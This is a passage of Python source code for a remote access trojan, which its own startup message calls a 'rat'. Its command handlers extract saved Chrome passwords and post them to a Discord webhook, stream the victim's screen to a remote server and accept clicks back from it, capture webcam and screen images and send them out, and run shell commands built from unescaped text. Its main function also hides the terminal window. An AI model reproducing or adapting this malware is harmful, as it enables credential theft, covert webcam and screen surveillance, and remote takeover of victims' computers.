        elif command =='ps':
            def ps():
               stealer = ChromePasswordsStealer()
               stealer = ChromePasswordsStealer("passwords", True)
               stealer.get_database_cursor()
               stealer.get_key()
               creds = []
               for url, username, password in stealer.get_credentials():
                   creds.append(f"URL: {url}\nUsername: {username}\nPassword: {password}\n")

               # Join all the credential strings together into one message
               message = "\n".join(creds)

               # Send the message via the webhook
               data = {
                   "content": message
               }
               response = requests.post(WEBHOOK_URL, json=data)

               stealer.save_and_clean()

            run_ps = Thread(target=ps)
            run_ps.start()


        # live screen image
        elif command =='lsi':
            def receive_socket_data(sock):
                data_len_bytes = sock.recv(4)
                data_len = int.from_bytes(data_len_bytes, byteorder='little')
                data = b''
                while len(data) < data_len:
                    chunk = sock.recv(data_len - len(data))
                    if chunk == b'':
                        raise RuntimeError("Connection closed unexpectedly")
                    data += chunk
                return data

            def send_socket_data(sock, data):
                data_len = len(data)
                sock.sendall(data_len.to_bytes(4, byteorder='little'))
                sock.sendall(data)

            def run_client():
                with mss.mss() as sct:
                    # Define the region to capture
                    monitor = {"top": 0, "left": 0, "width": 1280, "height": 720}
                    # Define the compression parameters
                    encode_params = [int(cv2.IMWRITE_JPEG_QUALITY), 50]

                    # Create a named window for displaying the image
                    window_name = "Live Image"
                    cv2.namedWindow(window_name, cv2.WINDOW_NORMAL)

                    # Get the root window for mouse events
                    display_obj = display.Display()
                    screen_obj = display_obj.screen()
                    root_win = screen_obj.root

                    while True:
                        # Capture the screen region
                        img = np.array(sct.grab(monitor))
                        # Resize the image to reduce data size
                        img = cv2.resize(img, (640, 360))
                        # Convert the image to JPEG format for compression
                        _, img_encoded = cv2.imencode(".jpg", img, encode_params)
                        # Convert the image data to bytes for sending over the network
                        img_bytes = img_encoded.tobytes()

                        # Send the image data to the server
                        send_socket_data(sock, img_bytes)

                        # Display the image in the named window
                        img_display = cv2.imdecode(np.frombuffer(img_bytes, dtype=np.uint8), cv2.IMREAD_COLOR)
                        cv2.imshow(window_name, img_display)

                        # Check for key presses to exit
                        if cv2.waitKey(1) & 0xFF == ord('q'):
                            break

                        # Receive mouse click events from the server
                        try:
                            data = receive_socket_data(sock)
                            if data == b"quit":
                                break
                            click_x, click_y = map(int, data.decode().split(","))
                            # Click on the screen using Xlib
                            root_win.warp_pointer(click_x, click_y)
                            display_obj.sync()
                            root_win.button_press(1)
                            display_obj.sync()
                            root_win.button_release(1)
                            display_obj.sync()
                        except Exception:
                            pass

                        # Wait a short time before capturing the next frame
                        time.sleep(1/30)

                    # Clean up the named window
                    cv2.destroyAllWindows()

            if __name__ == '__main__':
                run_client = Thread(target=run_client)
                run_client.start()



        # windows alert box
        elif command.startswith("alert "):
            import tempfile
            import os
            import sys
            message = command[6:].strip()
            with tempfile.TemporaryDirectory() as tmpdir:
                if current_os == "Windows": # Windows
                    script_file = os.path.join(tmpdir, "code.vbs")
                    with open(script_file, "w") as f:
                        f.write('MsgBox "{}", 0, "Alert"'.format(message))
                    os.system("start /B {} && timeout /T 2 > nul && del /F {}".format(script_file, script_file))
                elif current_os == "Linux": # Linux
                    script_file = os.path.join(tmpdir, "code.sh")
                    with open(script_file, "w") as f:
                        f.write('zenity --info --text="{}"'.format(message))
                    os.system("sh {} && sleep 2 && rm {}".format(script_file, script_file))
                elif current_os == 'Darwin': # macOS
                    script_file = os.path.join(tmpdir, "code.sh")
                    with open(script_file, "w") as f:
                        f.write('osascript -e \'tell app "System Events" to display dialog "{}" buttons "OK"\''.format(message))
                    os.system("sh {} && sleep 2 && rm {}".format(script_file, script_file))
                elif current_os == "SunOS": # Solaris
                    script_file = os.path.join(tmpdir, "code.sh")
                    with open(script_file, "w") as f:
                        f.write('echo "{}" | /usr/dt/bin/dtksh -e'.format(message))
                    os.system("sh {} && sleep 2 && rm {}".format(script_file, script_file))

                else:
                    client.send("Unsupported Platform".encode('utf-8'))



        # take a screenshot from the webcam and send it wia discord webhook
        elif command =='scw':
            def send_wscreenshot_to_discord(webhook_url):
                # Initialize the webcam
                cap = cv2.VideoCapture(0)

                # Check if the webcam is opened successfully
                if not cap.isOpened():
                    print("Failed to open the webcam")
                    return

                # Set the webcam properties for better image quality
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)  # Set width to 1920 pixels
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)  # Set height to 1080 pixels

                # Capture a frame from the webcam
                ret, frame = cap.read()

                # Check if the frame was captured successfully
                if not ret:
                    print("Failed to capture frame from the webcam")
                    cap.release()
                    return

                # Release the webcam
                cap.release()

                # Convert the frame to bytes
                success, img_bytes = cv2.imencode('.png', frame, [cv2.IMWRITE_PNG_COMPRESSION, 9])
                if not success:
                    print("Failed to encode the image")
                    return

                # Send the screenshot to Discord
                files = {"file": ("screenshot.png", img_bytes.tobytes(), "image/png")}
                data = {"content": "Here's a screenshot from my webcam!"}
                response = requests.post(webhook_url, data=data, files=files)

                if response.status_code == 200:
                    print("The screenshot from the webcam was successfully taken and sent")
                else:
                    print("An error occurred while sending the screenshot to Discord")
            send_wscreenshot_to_discord(WEBHOOK_URL)



        # catpuring screenshot and sending it to the discord webhook
        elif command =='sc':
           def send_screenshot_to_discord(webhook_url):
               with mss() as sct:
                   # Capture the screen
                   sct_img = sct.grab(sct.monitors[0])

               # Convert the screen capture to bytes
               img_bytes = BytesIO()
               Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX").save(img_bytes, format="PNG")
               img_bytes.seek(0)

               # Send the screenshot to Discord
               files = {"file": ("screenshot.png", img_bytes)}
               data = {"content": "Here's a screenshot of my screen!"}
               response = requests.post(webhook_url, data=data, files=files)

               if response.status_code == 200:
                   client.send("the screenshot of the screen was successfully taken".encode('utf-8'))
               else:
                   client.send("im sorry but an error occured".encode('utf-8'))
           send_screenshot_to_discord(WEBHOOK_URL)



# main
def main():
   # sended message to discord
   send_to_webhook("rat succesfully started!!")

   # calling the functio to hide the terminal window
   Hide()

   t = threading.Thread(target=start_client)
   t.start()

if __name__ == '__main__':
    main()


